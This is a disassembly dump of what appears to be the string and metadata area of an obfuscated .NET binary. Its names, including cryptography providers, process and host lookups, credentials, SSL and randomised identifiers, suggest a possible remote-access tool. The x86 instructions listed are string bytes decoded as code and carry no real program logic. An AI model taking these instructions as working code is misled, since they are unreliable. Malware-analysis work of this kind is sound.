  409420:	59                   	pop    %ecx
  409421:	4a                   	dec    %edx
  409422:	70 00                	jo     0x409424
  409424:	4d                   	dec    %ebp
  409425:	52                   	push   %edx
  409426:	70 48                	jo     0x409470
  409428:	61                   	popa
  409429:	56                   	push   %esi
  40942a:	72 47                	jb     0x409473
  40942c:	6f                   	outsl  %ds:(%esi),(%dx)
  40942d:	45                   	inc    %ebp
  40942e:	51                   	push   %ecx
  40942f:	70 00                	jo     0x409431
  409431:	4b                   	dec    %ebx
  409432:	47                   	inc    %edi
  409433:	4e                   	dec    %esi
  409434:	4b                   	dec    %ebx
  409435:	74 62                	je     0x409499
  409437:	67 68 44 52 70 00    	addr16 push $0x705244
  40943d:	53                   	push   %ebx
  40943e:	6c                   	insb   (%dx),%es:(%edi)
  40943f:	65 65 70 00          	gs gs jo 0x409443
  409443:	51                   	push   %ecx
  409444:	78 44                	js     0x40948a
  409446:	57                   	push   %edi
  409447:	63 75 59             	arpl   %esi,0x59(%ebp)
  40944a:	62 68 55             	bound  %ebp,0x55(%eax)
  40944d:	62 47 72             	bound  %eax,0x72(%edi)
  409450:	65 70 00             	gs jo  0x409453
  409453:	6b 76 6f 55          	imul   $0x55,0x6f(%esi),%esi
  409457:	77 4f                	ja     0x4094a8
  409459:	5a                   	pop    %edx
  40945a:	76 61                	jbe    0x4094bd
  40945c:	62 62 6a             	bound  %esp,0x6a(%edx)
  40945f:	70 00                	jo     0x409461
  409461:	4a                   	dec    %edx
  409462:	79 61                	jns    0x4094c5
  409464:	64 77 41             	fs ja  0x4094a8
  409467:	59                   	pop    %ecx
  409468:	4b                   	dec    %ebx
  409469:	52                   	push   %edx
  40946a:	52                   	push   %edx
  40946b:	56                   	push   %esi
  40946c:	48                   	dec    %eax
  40946d:	6d                   	insl   (%dx),%es:(%edi)
  40946e:	70 00                	jo     0x409470
  409470:	4d                   	dec    %ebp
  409471:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409478:	74 2e                	je     0x4094a8
  40947a:	43                   	inc    %ebx
  40947b:	53                   	push   %ebx
  40947c:	68 61 72 70 00       	push   $0x707261
  409481:	79 70                	jns    0x4094f3
  409483:	74 4b                	je     0x4094d0
  409485:	44                   	inc    %esp
  409486:	6c                   	insb   (%dx),%es:(%edi)
  409487:	49                   	dec    %ecx
  409488:	50                   	push   %eax
  409489:	76 6f                	jbe    0x4094fa
  40948b:	56                   	push   %esi
  40948c:	53                   	push   %ebx
  40948d:	75 70                	jne    0x4094ff
  40948f:	00 6a 69             	add    %ch,0x69(%edx)
  409492:	51                   	push   %ecx
  409493:	7a 78                	jp     0x40950d
  409495:	55                   	push   %ebp
  409496:	72 61                	jb     0x4094f9
  409498:	53                   	push   %ebx
  409499:	41                   	inc    %ecx
  40949a:	53                   	push   %ebx
  40949b:	62 46 76             	bound  %eax,0x76(%esi)
  40949e:	70 00                	jo     0x4094a0
  4094a0:	47                   	inc    %edi
  4094a1:	55                   	push   %ebp
  4094a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4094a3:	68 63 76 68 59       	push   $0x59687663
  4094a8:	6a 77                	push   $0x77
  4094aa:	70 00                	jo     0x4094ac
  4094ac:	68 4d 71 42 67       	push   $0x6742714d
  4094b1:	4e                   	dec    %esi
  4094b2:	71 5a                	jno    0x40950e
  4094b4:	54                   	push   %esp
  4094b5:	58                   	pop    %eax
  4094b6:	4c                   	dec    %esp
  4094b7:	69 42 56 66 46 71 00 	imul   $0x714666,0x56(%edx),%eax
  4094be:	72 42                	jb     0x409502
  4094c0:	58                   	pop    %eax
  4094c1:	70 50                	jo     0x409513
  4094c3:	58                   	pop    %eax
  4094c4:	42                   	inc    %edx
  4094c5:	51                   	push   %ecx
  4094c6:	70 71                	jo     0x409539
  4094c8:	56                   	push   %esi
  4094c9:	4d                   	dec    %ebp
  4094ca:	4c                   	dec    %esp
  4094cb:	71 00                	jno    0x4094cd
  4094cd:	77 66                	ja     0x409535
  4094cf:	45                   	inc    %ebp
  4094d0:	64 6b 54 58 68 6f    	imul   $0x6f,%fs:0x68(%eax,%ebx,2),%edx
  4094d6:	54                   	push   %esp
  4094d7:	71 00                	jno    0x4094d9
  4094d9:	79 76                	jns    0x409551
  4094db:	62 66 57             	bound  %esp,0x57(%esi)
  4094de:	59                   	pop    %ecx
  4094df:	54                   	push   %esp
  4094e0:	76 48                	jbe    0x40952a
  4094e2:	4c                   	dec    %esp
  4094e3:	6b 71 00 53          	imul   $0x53,0x0(%ecx),%esi
  4094e7:	79 73                	jns    0x40955c
  4094e9:	74 65                	je     0x409550
  4094eb:	6d                   	insl   (%dx),%es:(%edi)
  4094ec:	2e 4c                	cs dec %esp
  4094ee:	69 6e 71 00 44 6b 52 	imul   $0x526b4400,0x71(%esi),%ebp
  4094f5:	57                   	push   %edi
  4094f6:	6c                   	insb   (%dx),%es:(%edi)
  4094f7:	67 70 53             	addr16 jo 0x40954d
  4094fa:	41                   	inc    %ecx
  4094fb:	72 00                	jb     0x4094fd
  4094fd:	4d                   	dec    %ebp
  4094fe:	51                   	push   %ecx
  4094ff:	58                   	pop    %eax
  409500:	51                   	push   %ecx
  409501:	50                   	push   %eax
  409502:	43                   	inc    %ebx
  409503:	65 4a                	gs dec %edx
  409505:	47                   	inc    %edi
  409506:	61                   	popa
  409507:	6b 64 57 72 00       	imul   $0x0,0x72(%edi,%edx,2),%esp
  40950c:	47                   	inc    %edi
  40950d:	71 77                	jno    0x409586
  40950f:	58                   	pop    %eax
  409510:	64 7a 70             	fs jp  0x409583
  409513:	46                   	inc    %esi
  409514:	71 4d                	jno    0x409563
  409516:	58                   	pop    %eax
  409517:	69 53 5a 72 00 43 6c 	imul   $0x6c430072,0x5a(%ebx),%edx
  40951e:	65 61                	gs popa
  409520:	72 00                	jb     0x409522
  409522:	43                   	inc    %ebx
  409523:	68 61 72 00 43       	push   $0x43007261
  409528:	46                   	inc    %esi
  409529:	55                   	push   %ebp
  40952a:	46                   	inc    %esi
  40952b:	59                   	pop    %ecx
  40952c:	47                   	inc    %edi
  40952d:	54                   	push   %esp
  40952e:	6f                   	outsl  %ds:(%esi),(%dx)
  40952f:	51                   	push   %ecx
  409530:	6f                   	outsl  %ds:(%esi),(%dx)
  409531:	4d                   	dec    %ebp
  409532:	65 72 00             	gs jb  0x409535
  409535:	49                   	dec    %ecx
  409536:	6e                   	outsb  %ds:(%esi),(%dx)
  409537:	76 6f                	jbe    0x4095a8
  409539:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  40953d:	6d                   	insl   (%dx),%es:(%edi)
  40953e:	62 65 72             	bound  %esp,0x72(%ebp)
  409541:	00 4d 44             	add    %cl,0x44(%ebp)
  409544:	35 43 72 79 70       	xor    $0x70797243,%eax
  409549:	74 6f                	je     0x4095ba
  40954b:	53                   	push   %ebx
  40954c:	65 72 76             	gs jb  0x4095c5
  40954f:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409556:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  40955d:	41 
  40955e:	43                   	inc    %ebx
  40955f:	72 79                	jb     0x4095da
  409561:	70 74                	jo     0x4095d7
  409563:	6f                   	outsl  %ds:(%esi),(%dx)
  409564:	53                   	push   %ebx
  409565:	65 72 76             	gs jb  0x4095de
  409568:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40956f:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  409576:	73 
  409577:	43                   	inc    %ebx
  409578:	72 79                	jb     0x4095f3
  40957a:	70 74                	jo     0x4095f0
  40957c:	6f                   	outsl  %ds:(%esi),(%dx)
  40957d:	53                   	push   %ebx
  40957e:	65 72 76             	gs jb  0x4095f7
  409581:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409588:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  40958f:	72 
  409590:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  409597:	64 65 72 00          	fs gs jb 0x40959b
  40959b:	4d                   	dec    %ebp
  40959c:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4095a3:	74 2e                	je     0x4095d3
  4095a5:	43                   	inc    %ebx
  4095a6:	53                   	push   %ebx
  4095a7:	68 61 72 70 2e       	push   $0x2e707261
  4095ac:	52                   	push   %edx
  4095ad:	75 6e                	jne    0x40961d
  4095af:	74 69                	je     0x40961a
  4095b1:	6d                   	insl   (%dx),%es:(%edi)
  4095b2:	65 42                	gs inc %edx
  4095b4:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  4095bb:	61                   	popa
  4095bc:	6c                   	insb   (%dx),%es:(%edi)
  4095bd:	6c                   	insb   (%dx),%es:(%edi)
  4095be:	53                   	push   %ebx
  4095bf:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  4095c6:	65 
  4095c7:	72 00                	jb     0x4095c9
  4095c9:	67 65 74 5f          	addr16 gs je 0x40962c
  4095cd:	42                   	inc    %edx
  4095ce:	75 66                	jne    0x409636
  4095d0:	66 65 72 00          	data16 gs jb 0x4095d4
  4095d4:	73 65                	jae    0x40963b
  4095d6:	74 5f                	je     0x409637
  4095d8:	42                   	inc    %edx
  4095d9:	75 66                	jne    0x409641
  4095db:	66 65 72 00          	data16 gs jb 0x4095df
  4095df:	67 65 74 5f          	addr16 gs je 0x409642
  4095e3:	41                   	inc    %ecx
  4095e4:	73 49                	jae    0x40962f
  4095e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4095e7:	74 65                	je     0x40964e
  4095e9:	67 65 72 00          	addr16 gs jb 0x4095ed
  4095ed:	73 65                	jae    0x409654
  4095ef:	74 5f                	je     0x409650
  4095f1:	41                   	inc    %ecx
  4095f2:	73 49                	jae    0x40963d
  4095f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4095f5:	74 65                	je     0x40965c
  4095f7:	67 65 72 00          	addr16 gs jb 0x4095fb
  4095fb:	4d                   	dec    %ebp
  4095fc:	61                   	popa
  4095fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4095fe:	61                   	popa
  4095ff:	67 65 6d             	gs insl (%dx),%es:(%di)
  409602:	65 6e                	outsb  %gs:(%esi),(%dx)
  409604:	74 4f                	je     0x409655
  409606:	62 6a 65             	bound  %ebp,0x65(%edx)
  409609:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  40960d:	61                   	popa
  40960e:	72 63                	jb     0x409673
  409610:	68 65 72 00 53       	push   $0x53007265
  409615:	65 73 73             	gs jae 0x40968b
  409618:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40961f:	6e                   	outsb  %ds:(%esi),(%dx)
  409620:	67 45                	addr16 inc %ebp
  409622:	76 65                	jbe    0x409689
  409624:	6e                   	outsb  %ds:(%esi),(%dx)
  409625:	74 48                	je     0x40966f
  409627:	61                   	popa
  409628:	6e                   	outsb  %ds:(%esi),(%dx)
  409629:	64 6c                	fs insb (%dx),%es:(%edi)
  40962b:	65 72 00             	gs jb  0x40962e
  40962e:	54                   	push   %esp
  40962f:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  409636:	55                   	push   %ebp
  409637:	70 70                	jo     0x4096a9
  409639:	65 72 00             	gs jb  0x40963c
  40963c:	43                   	inc    %ebx
  40963d:	75 72                	jne    0x4096b1
  40963f:	72 65                	jb     0x4096a6
  409641:	6e                   	outsb  %ds:(%esi),(%dx)
  409642:	74 55                	je     0x409699
  409644:	73 65                	jae    0x4096ab
  409646:	72 00                	jb     0x409648
  409648:	53                   	push   %ebx
  409649:	74 72                	je     0x4096bd
  40964b:	65 61                	gs popa
  40964d:	6d                   	insl   (%dx),%es:(%edi)
  40964e:	57                   	push   %edi
  40964f:	72 69                	jb     0x4096ba
  409651:	74 65                	je     0x4096b8
  409653:	72 00                	jb     0x409655
  409655:	54                   	push   %esp
  409656:	65 78 74             	gs js  0x4096cd
  409659:	57                   	push   %edi
  40965a:	72 69                	jb     0x4096c5
  40965c:	74 65                	je     0x4096c3
  40965e:	72 00                	jb     0x409660
  409660:	45                   	inc    %ebp
  409661:	6e                   	outsb  %ds:(%esi),(%dx)
  409662:	74 65                	je     0x4096c9
  409664:	72 00                	jb     0x409666
  409666:	42                   	inc    %edx
  409667:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  40966e:	72 
  40966f:	74 65                	je     0x4096d6
  409671:	72 00                	jb     0x409673
  409673:	54                   	push   %esp
  409674:	6f                   	outsl  %ds:(%esi),(%dx)
  409675:	4c                   	dec    %esp
  409676:	6f                   	outsl  %ds:(%esi),(%dx)
  409677:	77 65                	ja     0x4096de
  409679:	72 00                	jb     0x40967b
  40967b:	51                   	push   %ecx
  40967c:	55                   	push   %ebp
  40967d:	41                   	inc    %ecx
  40967e:	46                   	inc    %esi
  40967f:	6e                   	outsb  %ds:(%esi),(%dx)
  409680:	59                   	pop    %ecx
  409681:	52                   	push   %edx
  409682:	63 4d 6a             	arpl   %ecx,0x6a(%ebp)
  409685:	72 00                	jb     0x409687
  409687:	78 4e                	js     0x4096d7
  409689:	6a 74                	push   $0x74
  40968b:	41                   	inc    %ecx
  40968c:	63 49 6a             	arpl   %ecx,0x6a(%ecx)
  40968f:	76 6f                	jbe    0x409700
  409691:	42                   	inc    %edx
  409692:	69 55 6c 72 00 49 45 	imul   $0x45490072,0x6c(%ebp),%edx
  409699:	6e                   	outsb  %ds:(%esi),(%dx)
  40969a:	75 6d                	jne    0x409709
  40969c:	65 72 61             	gs jb  0x409700
  40969f:	74 6f                	je     0x409710
  4096a1:	72 00                	jb     0x4096a3
  4096a3:	4d                   	dec    %ebp
  4096a4:	61                   	popa
  4096a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4096a6:	61                   	popa
  4096a7:	67 65 6d             	gs insl (%dx),%es:(%di)
  4096aa:	65 6e                	outsb  %gs:(%esi),(%dx)
  4096ac:	74 4f                	je     0x4096fd
  4096ae:	62 6a 65             	bound  %ebp,0x65(%edx)
  4096b1:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4096b5:	75 6d                	jne    0x409724
  4096b7:	65 72 61             	gs jb  0x40971b
  4096ba:	74 6f                	je     0x40972b
  4096bc:	72 00                	jb     0x4096be
  4096be:	53                   	push   %ebx
  4096bf:	79 73                	jns    0x409734
  4096c1:	74 65                	je     0x409728
  4096c3:	6d                   	insl   (%dx),%es:(%edi)
  4096c4:	2e 43                	cs inc %ebx
  4096c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4096c7:	6c                   	insb   (%dx),%es:(%edi)
  4096c8:	6c                   	insb   (%dx),%es:(%edi)
  4096c9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4096ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4096cf:	73 2e                	jae    0x4096ff
  4096d1:	49                   	dec    %ecx
  4096d2:	45                   	inc    %ebp
  4096d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4096d4:	75 6d                	jne    0x409743
  4096d6:	65 72 61             	gs jb  0x40973a
  4096d9:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  4096dd:	47                   	inc    %edi
  4096de:	65 74 45             	gs je  0x409726
  4096e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4096e2:	75 6d                	jne    0x409751
  4096e4:	65 72 61             	gs jb  0x409748
  4096e7:	74 6f                	je     0x409758
  4096e9:	72 00                	jb     0x4096eb
  4096eb:	41                   	inc    %ecx
  4096ec:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4096f0:	61                   	popa
  4096f1:	74 6f                	je     0x409762
  4096f3:	72 00                	jb     0x4096f5
  4096f5:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  4096fa:	00 2e                	add    %ch,(%esi)
  4096fc:	63 63 74             	arpl   %esp,0x74(%ebx)
  4096ff:	6f                   	outsl  %ds:(%esi),(%dx)
  409700:	72 00                	jb     0x409702
  409702:	4d                   	dec    %ebp
  409703:	6f                   	outsl  %ds:(%esi),(%dx)
  409704:	6e                   	outsb  %ds:(%esi),(%dx)
  409705:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  40970c:	65 
  40970d:	61                   	popa
  40970e:	74 65                	je     0x409775
  409710:	44                   	inc    %esp
  409711:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409715:	70 74                	jo     0x40978b
  409717:	6f                   	outsl  %ds:(%esi),(%dx)
  409718:	72 00                	jb     0x40971a
  40971a:	43                   	inc    %ebx
  40971b:	72 65                	jb     0x409782
  40971d:	61                   	popa
  40971e:	74 65                	je     0x409785
  409720:	45                   	inc    %ebp
  409721:	6e                   	outsb  %ds:(%esi),(%dx)
  409722:	63 72 79             	arpl   %esi,0x79(%edx)
  409725:	70 74                	jo     0x40979b
  409727:	6f                   	outsl  %ds:(%esi),(%dx)
  409728:	72 00                	jb     0x40972a
  40972a:	49                   	dec    %ecx
  40972b:	6e                   	outsb  %ds:(%esi),(%dx)
  40972c:	74 50                	je     0x40977e
  40972e:	74 72                	je     0x4097a2
  409730:	00 44 63 63          	add    %al,0x63(%ebx,%eiz,2)
  409734:	66 74 76             	data16 je 0x4097ad
  409737:	5a                   	pop    %edx
  409738:	58                   	pop    %eax
  409739:	50                   	push   %eax
  40973a:	76 51                	jbe    0x40978d
  40973c:	73 00                	jae    0x40973e
  40973e:	63 79 63             	arpl   %edi,0x63(%ecx)
  409741:	56                   	push   %esi
  409742:	53                   	push   %ebx
  409743:	46                   	inc    %esi
  409744:	59                   	pop    %ecx
  409745:	76 51                	jbe    0x409798
  409747:	42                   	inc    %edx
  409748:	56                   	push   %esi
  409749:	66 62 73 00          	bound  %si,0x0(%ebx)
  40974d:	53                   	push   %ebx
  40974e:	79 73                	jns    0x4097c3
  409750:	74 65                	je     0x4097b7
  409752:	6d                   	insl   (%dx),%es:(%edi)
  409753:	2e 44                	cs inc %esp
  409755:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40975c:	69 63 73 00 4a 45 56 	imul   $0x56454a00,0x73(%ebx),%esp
  409763:	66 63 4e 50          	arpl   %cx,0x50(%esi)
  409767:	69 72 77 73 63 73 00 	imul   $0x736373,0x77(%edx),%esi
  40976e:	4d                   	dec    %ebp
  40976f:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409776:	74 2e                	je     0x4097a6
  409778:	56                   	push   %esi
  409779:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  409780:	73 69                	jae    0x4097eb
  409782:	63 2e                	arpl   %ebp,(%esi)
  409784:	44                   	inc    %esp
  409785:	65 76 69             	gs jbe 0x4097f1
  409788:	63 65 73             	arpl   %esp,0x73(%ebp)
  40978b:	00 53 79             	add    %dl,0x79(%ebx)
  40978e:	73 74                	jae    0x409804
  409790:	65 6d                	gs insl (%dx),%es:(%edi)
  409792:	2e 52                	cs push %edx
  409794:	75 6e                	jne    0x409804
  409796:	74 69                	je     0x409801
  409798:	6d                   	insl   (%dx),%es:(%edi)
  409799:	65 2e 49             	gs cs dec %ecx
  40979c:	6e                   	outsb  %ds:(%esi),(%dx)
  40979d:	74 65                	je     0x409804
  40979f:	72 6f                	jb     0x409810
  4097a1:	70 53                	jo     0x4097f6
  4097a3:	65 72 76             	gs jb  0x40981c
  4097a6:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4097ad:	73 74                	jae    0x409823
  4097af:	65 6d                	gs insl (%dx),%es:(%edi)
  4097b1:	2e 52                	cs push %edx
  4097b3:	75 6e                	jne    0x409823
  4097b5:	74 69                	je     0x409820
  4097b7:	6d                   	insl   (%dx),%es:(%edi)
  4097b8:	65 2e 43             	gs cs inc %ebx
  4097bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4097bc:	6d                   	insl   (%dx),%es:(%edi)
  4097bd:	70 69                	jo     0x409828
  4097bf:	6c                   	insb   (%dx),%es:(%edi)
  4097c0:	65 72 53             	gs jb  0x409816
  4097c3:	65 72 76             	gs jb  0x40983c
  4097c6:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4097cd:	62 75 67             	bound  %esi,0x67(%ebp)
  4097d0:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  4097d7:	65 
  4097d8:	73 00                	jae    0x4097da
  4097da:	45                   	inc    %ebp
  4097db:	78 70                	js     0x40984d
  4097dd:	61                   	popa
  4097de:	6e                   	outsb  %ds:(%esi),(%dx)
  4097df:	64 45                	fs inc %ebp
  4097e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4097e2:	76 69                	jbe    0x40984d
  4097e4:	72 6f                	jb     0x409855
  4097e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4097e7:	6d                   	insl   (%dx),%es:(%edi)
  4097e8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097ea:	74 56                	je     0x409842
  4097ec:	61                   	popa
  4097ed:	72 69                	jb     0x409858
  4097ef:	61                   	popa
  4097f0:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  4097f4:	00 47 65             	add    %al,0x65(%edi)
  4097f7:	74 50                	je     0x409849
  4097f9:	72 6f                	jb     0x40986a
  4097fb:	63 65 73             	arpl   %esp,0x73(%ebp)
  4097fe:	73 65                	jae    0x409865
  409800:	73 00                	jae    0x409802
  409802:	47                   	inc    %edi
  409803:	65 74 48             	gs je  0x40984e
  409806:	6f                   	outsl  %ds:(%esi),(%dx)
  409807:	73 74                	jae    0x40987d
  409809:	41                   	inc    %ecx
  40980a:	64 64 72 65          	fs fs jb 0x409873
  40980e:	73 73                	jae    0x409883
  409810:	65 73 00             	gs jae 0x409813
  409813:	53                   	push   %ebx
  409814:	79 73                	jns    0x409889
  409816:	74 65                	je     0x40987d
  409818:	6d                   	insl   (%dx),%es:(%edi)
  409819:	2e 53                	cs push %ebx
  40981b:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40981f:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409826:	70 
  409827:	74 6f                	je     0x409898
  409829:	67 72 61             	addr16 jb 0x40988d
  40982c:	70 68                	jo     0x409896
  40982e:	79 2e                	jns    0x40985e
  409830:	58                   	pop    %eax
  409831:	35 30 39 43 65       	xor    $0x65433930,%eax
  409836:	72 74                	jb     0x4098ac
  409838:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40983f:	73 00                	jae    0x409841
  409841:	52                   	push   %edx
  409842:	66 63 32             	arpl   %si,(%edx)
  409845:	38 39                	cmp    %bh,(%ecx)
  409847:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  40984b:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  409852:	73 00                	jae    0x409854
  409854:	52                   	push   %edx
  409855:	65 61                	gs popa
  409857:	64 41                	fs inc %ecx
  409859:	6c                   	insb   (%dx),%es:(%edi)
  40985a:	6c                   	insb   (%dx),%es:(%edi)
  40985b:	42                   	inc    %edx
  40985c:	79 74                	jns    0x4098d2
  40985e:	65 73 00             	gs jae 0x409861
  409861:	47                   	inc    %edi
  409862:	65 74 42             	gs je  0x4098a7
  409865:	79 74                	jns    0x4098db
  409867:	65 73 00             	gs jae 0x40986a
  40986a:	43                   	inc    %ebx
  40986b:	53                   	push   %ebx
  40986c:	68 61 72 70 41       	push   $0x41707261
  409871:	72 67                	jb     0x4098da
  409873:	75 6d                	jne    0x4098e2
  409875:	65 6e                	outsb  %gs:(%esi),(%dx)
  409877:	74 49                	je     0x4098c2
  409879:	6e                   	outsb  %ds:(%esi),(%dx)
  40987a:	66 6f                	outsw  %ds:(%esi),(%dx)
  40987c:	46                   	inc    %esi
  40987d:	6c                   	insb   (%dx),%es:(%edi)
  40987e:	61                   	popa
  40987f:	67 73 00             	addr16 jae 0x409882
  409882:	43                   	inc    %ebx
  409883:	53                   	push   %ebx
  409884:	68 61 72 70 42       	push   $0x42707261
  409889:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  409890:	61                   	popa
  409891:	67 73 00             	addr16 jae 0x409894
  409894:	46                   	inc    %esi
  409895:	6b 6e 42 58          	imul   $0x58,0x42(%esi),%ebp
  409899:	53                   	push   %ebx
  40989a:	54                   	push   %esp
  40989b:	6c                   	insb   (%dx),%es:(%edi)
  40989c:	69 67 73 00 53 74 72 	imul   $0x72745300,0x73(%edi),%esp
  4098a3:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  4098aa:	73 73                	jae    0x40991f
  4098ac:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4098b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4098b4:	67 45                	addr16 inc %ebp
  4098b6:	76 65                	jbe    0x40991d
  4098b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4098b9:	74 41                	je     0x4098fc
  4098bb:	72 67                	jb     0x409924
  4098bd:	73 00                	jae    0x4098bf
  4098bf:	65 47                	gs inc %edi
  4098c1:	50                   	push   %eax
  4098c2:	52                   	push   %edx
  4098c3:	6b 78 72 76          	imul   $0x76,0x72(%eax),%edi
  4098c7:	57                   	push   %edi
  4098c8:	6a 6b                	push   $0x6b
  4098ca:	73 00                	jae    0x4098cc
  4098cc:	49                   	dec    %ecx
  4098cd:	43                   	inc    %ebx
  4098ce:	72 65                	jb     0x409935
  4098d0:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4098d3:	74 69                	je     0x40993e
  4098d5:	61                   	popa
  4098d6:	6c                   	insb   (%dx),%es:(%edi)
  4098d7:	73 00                	jae    0x4098d9
  4098d9:	73 65                	jae    0x409940
  4098db:	74 5f                	je     0x40993c
  4098dd:	43                   	inc    %ebx
  4098de:	72 65                	jb     0x409945
  4098e0:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4098e3:	74 69                	je     0x40994e
  4098e5:	61                   	popa
  4098e6:	6c                   	insb   (%dx),%es:(%edi)
  4098e7:	73 00                	jae    0x4098e9
  4098e9:	45                   	inc    %ebp
  4098ea:	71 75                	jno    0x409961
  4098ec:	61                   	popa
  4098ed:	6c                   	insb   (%dx),%es:(%edi)
  4098ee:	73 00                	jae    0x4098f0
  4098f0:	53                   	push   %ebx
  4098f1:	73 6c                	jae    0x40995f
  4098f3:	50                   	push   %eax
  4098f4:	72 6f                	jb     0x409965
  4098f6:	74 6f                	je     0x409967
  4098f8:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4098fb:	73 00                	jae    0x4098fd
  4098fd:	53                   	push   %ebx
  4098fe:	79 73                	jns    0x409973
  409900:	74 65                	je     0x409967
  409902:	6d                   	insl   (%dx),%es:(%edi)
  409903:	2e 57                	cs push %edi
  409905:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  40990c:	46                   	inc    %esi
  40990d:	6f                   	outsl  %ds:(%esi),(%dx)
  40990e:	72 6d                	jb     0x40997d
  409910:	73 00                	jae    0x409912
  409912:	44                   	inc    %esp
  409913:	6e                   	outsb  %ds:(%esi),(%dx)
  409914:	73 00                	jae    0x409916
  409916:	43                   	inc    %ebx
  409917:	6f                   	outsl  %ds:(%esi),(%dx)
  409918:	6e                   	outsb  %ds:(%esi),(%dx)
  409919:	74 61                	je     0x40997c
  40991b:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  409922:	74 65                	je     0x409989
  409924:	6d                   	insl   (%dx),%es:(%edi)
  409925:	2e 43                	cs inc %ebx
  409927:	6f                   	outsl  %ds:(%esi),(%dx)
  409928:	6c                   	insb   (%dx),%es:(%edi)
  409929:	6c                   	insb   (%dx),%es:(%edi)
  40992a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40992f:	6e                   	outsb  %ds:(%esi),(%dx)
  409930:	73 00                	jae    0x409932
  409932:	53                   	push   %ebx
  409933:	74 72                	je     0x4099a7
  409935:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  40993c:	74 4f                	je     0x40998d
  40993e:	70 74                	jo     0x4099b4
  409940:	69 6f 6e 73 00 6b 41 	imul   $0x416b0073,0x6e(%edi),%ebp
  409947:	4f                   	dec    %edi
  409948:	46                   	inc    %esi
  409949:	74 43                	je     0x40998e
  40994b:	62 46 4c             	bound  %eax,0x4c(%esi)
  40994e:	57                   	push   %edi
  40994f:	50                   	push   %eax
  409950:	71 73                	jno    0x4099c5
  409952:	00 78 45             	add    %bh,0x45(%eax)
  409955:	63 67 79             	arpl   %esp,0x79(%edi)
  409958:	73 7a                	jae    0x4099d4
  40995a:	79 48                	jns    0x4099a4
  40995c:	73 6c                	jae    0x4099ca
  40995e:	45                   	inc    %ebp
  40995f:	55                   	push   %ebp
  409960:	71 73                	jno    0x4099d5
  409962:	00 47 65             	add    %al,0x65(%edi)
  409965:	74 49                	je     0x4099b0
  409967:	6d                   	insl   (%dx),%es:(%edi)
  409968:	61                   	popa
  409969:	67 65 44             	addr16 gs inc %esp
  40996c:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409970:	65 72 73             	gs jb  0x4099e6
